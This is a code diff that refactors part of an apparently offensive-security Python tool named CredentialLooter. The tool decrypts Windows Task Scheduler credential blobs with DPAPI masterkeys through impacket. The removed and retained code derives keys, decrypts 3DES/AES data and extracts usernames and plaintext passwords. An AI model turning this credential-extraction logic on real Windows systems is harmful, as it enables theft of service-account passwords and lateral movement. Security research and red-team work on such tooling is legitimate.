@@ -5,7 +5,6 @@ This module implements automatic discovery, extraction, and decryption of
 Task Scheduler credentials using DPAPI masterkeys.
 """
 
-import contextlib
 import json
 import logging
 import os
@@ -19,7 +18,13 @@ from impacket.smbconnection import SMBConnection as ImpacketSMBConnection
 
 from ..parsers.task_xml import parse_task_xml
 from ..utils.helpers import is_guid
-from .decryptor import DPAPIDecryptor, MasterkeyInfo, ScheduledTaskCredential
+from .decryptor import (
+    DPAPIDecryptor,
+    MasterkeyInfo,
+    ScheduledTaskCredential,
+    _decrypt_dpapi_blob,
+    _parse_credential_blob,
+)
 
 
 class CredentialLooter:
@@ -526,127 +531,36 @@ def _decrypt_credential_blob_offline(
     """
     Decrypt a credential blob using offline masterkeys
 
-    This is a simplified version of DPAPIDecryptor.decrypt_credential_blob()
-    that works with files instead of SMB connections
+    Mirrors DPAPIDecryptor.decrypt_credential_blob() but resolves the masterkey from a
+    pre-decrypted dict (files, not SMB). Shares the crypto core and field parsing.
     """
-    from impacket.dpapi import CREDENTIAL_BLOB, DPAPI_BLOB, CredentialFile
+    from impacket.dpapi import DPAPI_BLOB, CredentialFile
     from impacket.uuid import bin_to_string
 
     try:
-        # Try to parse as CredentialFile first
+        # Try to parse as CredentialFile first; otherwise treat as a raw DPAPI blob
         try:
             cred_file = CredentialFile(blob_bytes)
             dpapi_blob_bytes = cred_file["Data"]
             logging.debug("Parsed as CredentialFile format")
         except (KeyError, struct.error):
-            # If that fails, treat as raw DPAPI blob
             dpapi_blob_bytes = blob_bytes
             logging.debug("Treating as raw DPAPI blob")
 
-        # Parse DPAPI blob to get masterkey GUID
         dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
         masterkey_guid = bin_to_string(dpapi_blob["GuidMasterKey"]).lower()
 
-        # Find corresponding masterkey
         mk_info = masterkeys.get(masterkey_guid)
         if not mk_info:
             logging.debug(f"Masterkey {masterkey_guid} not found for blob {blob_path}")
             return ScheduledTaskCredential(task_name="", blob_path=blob_path, target=None)
 
-        # Decrypt the blob (simplified version of _decrypt_blob from decryptor.py)
-        decrypted = _decrypt_dpapi_blob_data(dpapi_blob_bytes, mk_info)
+        decrypted = _decrypt_dpapi_blob(dpapi_blob_bytes, mk_info)
         if not decrypted:
             return None
 
-        # Parse decrypted credential
-        cred_blob = CREDENTIAL_BLOB(decrypted)
-
-        # Extract task name/GUID from Target field
-        target_str = None
-        task_name = ""
-        if cred_blob["Target"]:
-            target_str = cred_blob["Target"].decode("utf-16-le", errors="ignore").rstrip("\x00")
-            if "Task:{" in target_str and "}" in target_str:
-                task_guid = target_str.split("Task:{")[1].split("}")[0]
-                task_name = f"Task:{{{task_guid}}}"
-
-        # Extract username and password
-        username = None
-        password = None
-
-        if cred_blob["Username"]:
-            username = cred_blob["Username"].decode("utf-16-le", errors="ignore").rstrip("\x00")
-
-        if cred_blob["Unknown3"]:
-            password = cred_blob["Unknown3"].decode("utf-16-le", errors="ignore").rstrip("\x00")
-
-        return ScheduledTaskCredential(
-            task_name=task_name, blob_path=blob_path, username=username, password=password, target=target_str
-        )
+        return _parse_credential_blob(decrypted, blob_path)
 
     except Exception as e:
         logging.debug(f"Error decrypting credential blob: {e}")
-        return None
-
-
-def _decrypt_dpapi_blob_data(dpapi_blob_bytes: bytes, mk_info: MasterkeyInfo) -> bytes | None:
-    """Decrypt DPAPI blob data with masterkey (simplified from decryptor.py)"""
-    from binascii import unhexlify
-
-    from Cryptodome.Cipher import AES, DES3
-    from Cryptodome.Hash import HMAC, SHA1, SHA512
-    from Cryptodome.Util.Padding import unpad
-    from impacket.dpapi import DPAPI_BLOB
-
-    try:
-        dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
-
-        # Get algorithm info
-        ALGORITHMS_DATA = {
-            0x6603: (168, DES3, DES3.MODE_CBC, 8),  # CALG_3DES
-            0x6611: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128
-            0x660E: (128, AES, AES.MODE_CBC, 16),  # CALG_AES_128 (alt)
-            0x660F: (192, AES, AES.MODE_CBC, 16),  # CALG_AES_192
-            0x6610: (256, AES, AES.MODE_CBC, 16),  # CALG_AES_256
-        }
-
-        # Hash algorithms
-        HASH_ALGOS = {
-            0x8004: SHA1,  # CALG_SHA1
-            0x800E: SHA512,  # CALG_SHA_512
-        }
-
-        hash_algo = HASH_ALGOS.get(dpapi_blob["HashAlgo"], SHA1)
-
-        # Derive session key using key hash and salt
-        if mk_info.sha1 is None:
-            return None
-        key_hash = unhexlify(mk_info.sha1)
-
-        # Compute session key (using HMAC)
-        h = HMAC.new(key_hash, dpapi_blob["Salt"], hash_algo)
-        session_key = h.digest()
-
-        # Derive encryption key from session key
-        derived_key = dpapi_blob.deriveKey(session_key)
-
-        # Decrypt data
-        crypto_info = ALGORITHMS_DATA.get(dpapi_blob["CryptAlgo"])
-        if not crypto_info:
-            logging.error(f"Unsupported crypto algorithm: {dpapi_blob['CryptAlgo']:#x}")
-            return None
-
-        key_len, cipher_algo, mode, block_size = crypto_info
-
-        cipher = cipher_algo.new(derived_key[: key_len // 8], mode=mode, iv=b"\x00" * block_size)
-        cleartext = cipher.decrypt(dpapi_blob["Data"])
-
-        # Remove padding
-        with contextlib.suppress(ValueError):
-            cleartext = unpad(cleartext, block_size)
-
-        return cleartext
-
-    except Exception as e:
-        logging.debug(f"Error decrypting DPAPI blob: {e}")
         return None
